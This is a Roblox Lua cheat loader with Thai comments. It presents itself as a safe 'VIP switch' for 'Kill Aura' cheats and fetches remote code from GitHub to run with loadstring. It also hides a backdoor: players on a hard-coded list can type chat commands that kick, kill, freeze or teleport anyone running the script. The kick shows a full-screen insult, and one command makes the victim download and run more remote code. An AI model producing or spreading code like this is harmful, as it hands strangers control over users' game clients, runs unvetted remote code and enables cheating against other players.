-- [[ Humanx1 Loader - Safe VIP Switch (Chat Protected 100%) ]]

local Player = game.Players.LocalPlayer
local Camera = workspace.CurrentCamera
local MyName = Player.Name

-- รายชื่อ Admin/VIP หลัก
_G.VIP_LIST = _G.VIP_LIST or {
    ["ffsww_1007"] = true,
    ["A_ASPD"] = true,
    ["HACKER_18050"] = true,
    ["evils915"] = true,
    ["TV_BTS1"] = true,
    ["Winwie001"] = true
}

-- ฟังก์ชันแจ้งเตือน (Notification)
local function ShowNotify(text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Humanx1 System",
        Text = text,
        Duration = 5
    })
end

-- ฟังก์ชันดีดออก (ด่า "โดนกูเตะไงไอ้ควาย" แบบเต็มจอ)
local function CustomKick()
    local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
    ScreenGui.IgnoreGuiInset = true
    local TextLabel = Instance.new("TextLabel", ScreenGui)
    TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.BackgroundTransparency = 0.05
    TextLabel.Size = UDim2.new(1, 0, 1, 0)
    TextLabel.Font = Enum.Font.FredokaOne
    TextLabel.Text = "โดนกูเตะไงไอ้ควาย" -- คำด่าเดียวกันหมดตามสั่ง 555
    TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    TextLabel.TextScaled = true
    TextLabel.ZIndex = 999999

    task.wait(2.5) -- ให้มันอ่านความกวนตีนก่อนเด้ง
    Player:Kick("\n\n[ Humanx1 System ]\nโดนกูเตะไงไอ้ควาย\n(error555)\n\n")
end

-- ฟังก์ชันค้นหาผู้เล่น
local function findByPartialName(name)
    name = name:lower()
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #name) == name then return p end
    end
    return nil
end

-- [[ ระบบคำสั่งแชท ]]
local function ListenChat(speaker, msg)
    local args = msg:split(" ")
    local command = args[1]:lower()
    
    if _G.VIP_LIST[speaker.Name] then
        local target = args[2] and findByPartialName(args[2])

        -- === คำสั่งเสริมที่เพิ่มเข้าไป ===
        if speaker.Name == MyName then
            if command == "!view" and target then
                Camera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
            elseif command == "!unview" then
                Camera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
            elseif command == "!checkvip" then
                local list = "VIPs: "
                for name, _ in pairs(_G.VIP_LIST) do if game.Players:FindFirstChild(name) then list = list .. name .. ", " end end
                ShowNotify(list)
            end
        end

        -- 1. หมวดเตะ (ด่าเหมือนกันหมด)
        if command == "!kick" and target == Player then
            CustomKick()
        elseif command == "!kickall" then
            CustomKick()

        -- 2. หมวดสังหาร (Reset ตัวละคร เลือด 0)
        elseif command == "!kill" and target == Player then
            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
                Player.Character:FindFirstChildOfClass("Humanoid").Health = 0
            end
        elseif command == "!killall" then
            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
                Player.Character:FindFirstChildOfClass("Humanoid").Health = 0
            end

        -- 3. หมวด TP
        elseif command == "!tp" and target == Player then
            if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
                if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                    Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
                end
            end

        -- 4. หมวดควบคุม
        elseif command == "!freeze" and target == Player then
            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                Player.Character.HumanoidRootPart.Anchored = true
            end
        elseif command == "!unfreeze" and target == Player then
            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
                Player.Character.HumanoidRootPart.Anchored = false
            end
        elseif command == "!jump" and target == Player then
            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
                Player.Character:FindFirstChildOfClass("Humanoid").Jump = true
            end

        -- 5. มอบ VIP (เช็คกันกิ๊ฟซ้ำ)
        elseif command == "!givevip" and target == Player then
            if _G.VIP_LIST[Player.Name] then
                if speaker.Name == MyName then ShowNotify("คนนี้ have vip อยู่เเล้ว") end
            else
                _G.VIP_LIST[Player.Name] = true
                loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
            end
        end
    end
end

-- เชื่อมต่อระบบ
for _, p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(msg) ListenChat(p, msg) end) end
game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(msg) ListenChat(p, msg) end) end)

-- [ เริ่มต้นรันสคริปต์ ]
if _G.VIP_LIST[MyName] then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
end
